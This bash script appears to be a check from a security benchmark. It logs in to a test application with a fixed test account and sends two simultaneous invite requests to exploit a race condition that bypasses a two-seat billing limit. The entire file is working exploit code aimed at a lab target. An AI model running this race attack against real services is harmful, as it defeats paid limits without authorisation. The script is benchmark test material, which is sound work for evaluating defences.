#!/usr/bin/env bash
set -euo pipefail
. "$(dirname "$0")/_lib.sh"
login user1@bench.local User123!
# Reset seat limit to 2 where the vulnerable billing endpoint permits it.
curl -s -b "$JAR" -X POST "$TARGET/api/billing/seats" --data-urlencode 'seats=2' >/dev/null || true
rm -f /tmp/rails-race-a.$$ /tmp/rails-race-b.$$
curl -s -b "$JAR" -X POST "$TARGET/api/invites" --data-urlencode "email=race-a-$$@bench.local" > /tmp/rails-race-a.$$ &
p1=$!
curl -s -b "$JAR" -X POST "$TARGET/api/invites" --data-urlencode "email=race-b-$$@bench.local" > /tmp/rails-race-b.$$ &
p2=$!
wait $p1 || true; wait $p2 || true
both=$(cat /tmp/rails-race-a.$$ /tmp/rails-race-b.$$); rm -f /tmp/rails-race-a.$$ /tmp/rails-race-b.$$
[ "$(printf '%s' "$both" | grep -o '"ok":true' | wc -l | tr -d ' ')" -ge 2 ]
